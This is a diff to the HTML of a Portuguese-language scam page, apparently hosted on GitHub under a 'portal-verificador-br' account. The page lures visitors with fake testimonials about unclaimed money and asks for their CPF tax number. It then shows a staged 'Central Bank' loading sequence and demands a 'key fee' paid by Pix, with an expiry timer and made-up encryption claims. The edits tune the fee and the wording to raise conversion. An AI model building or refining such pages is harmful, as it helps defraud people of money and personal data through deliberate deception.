@@ -53,11 +53,11 @@
             <img src="https://github.com/portal-verificador-br/robertomenezes/blob/main/inter.png?raw=true" class="w-full border-2 border-black rounded-lg my-4 shadow-lg">
 
             <div class="bg-yellow-50 border-2 border-dashed border-yellow-400 p-6 rounded-xl text-center my-6">
-                <button onclick="nextPage(2)" class="btn-modern">CONSULTAR VALORES DISPONÍVEIS</button>
+                <button onclick="nextPage(2)" class="btn-modern">CONSULTAR VALORES DE RENDIMENTOS</button>
             </div>
 
             <div class="mt-10">
-                <p class="font-bold border-b pb-2 mb-4">208 Comentários</p>
+                <p class="font-bold border-b pb-2 mb-4">209 Comentários</p>
                 <div class="comment-item">
                     <img src="https://randomuser.me/api/portraits/men/32.jpg">
                     <div><p class="comment-name">Fernando Souza</p><p class="comment-text">Fiz agora e apareceu 1940 reais! Roberto, Deus te abençoe por isso.</p><p class="comment-meta">Curtir · Responder · 2 min</p></div>
@@ -102,7 +102,7 @@
         </div>
 
         <div id="p2" class="page">
-            <h2 class="text-xl font-black text-center mb-8 italic uppercase">Consulta de Rendimentos. Insira seu CPF</h2>
+            <h2 class="text-xl font-black text-center mb-8 italic uppercase">Consulta de Rendimentos. Insira seu CPF ABAIXO.</h2>
             <input type="tel" id="cpf_user" oninput="mask(this, '###.###.###-##')" class="w-full p-5 bg-gray-100 rounded-full outline-none font-bold text-center text-xl mb-6 border-2 border-transparent focus:border-green-500" placeholder="000.000.000-00">
             <button onclick="loader(3, 4, 'Buscando taxa de rendimentos...', 5000)" class="btn-modern">CONSULTAR AGORA</button>
         </div>
@@ -152,14 +152,14 @@
         <div id="p8" class="page text-center py-20">
             <div class="loading-circle" style="border-top-color:#c00"></div>
             <p class="text-5xl font-black" id="final-pct">0%</p>
-            <h3 class="text-lg font-bold mt-4">Integrando chave ao Banco Central...</h3>
+            <h3 class="text-lg font-bold mt-4">Integrando Chave 892 ao Banco Central...</h3>
         </div>
 
         <div id="p9" class="page text-center">
             <div class="border-t-8 border-red-600 p-6 shadow-xl">
                 <h3 class="text-2xl font-black text-red-600 mb-4 uppercase">Erro de Ativação</h3>
-                <p class="text-sm mb-6">Pague a <b>Taxa de Chave para Saque de Rendimentos (TAC)</b> para liberar seu saldo imediatamente.</p>
-                <div class="bg-gray-100 p-6 rounded-xl mb-6"><p class="text-4xl font-black">R$ 97,00</p></div>
+                <p class="text-sm mb-6">Pague a <b>Taxa de Chave para Saque de Rendimentos (TAC)</b> e libere seu saldo imediatamente.</p>
+                <div class="bg-gray-100 p-6 rounded-xl mb-6"><p class="text-4xl font-black">R$ 27,00</p></div>
                 <button onclick="nextPage(10)" class="btn-modern" style="background:#c00">PAGAR E ATIVAR</button>
             </div>
         </div>
@@ -171,7 +171,7 @@
                 <p class="text-red-600 font-bold mb-4">EXPIRA EM: <span id="timer">05:00</span></p>
                 <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=CHAVE_PIX_AQUI" class="mx-auto mb-4 border-4 border-white">
                 <button onclick="alert('Copiado!')" class="w-full bg-blue-600 text-white font-black py-4 rounded-full mb-4">COPIA E COLA PIX</button>
-                <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest">Protocolo 892 - Santander Inc.</p>
+                <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest">Protocolo 892 - Transação protegida por criptografia de dados Nacional (SSL 256-bit).</p>
             </div>
         </div>
 
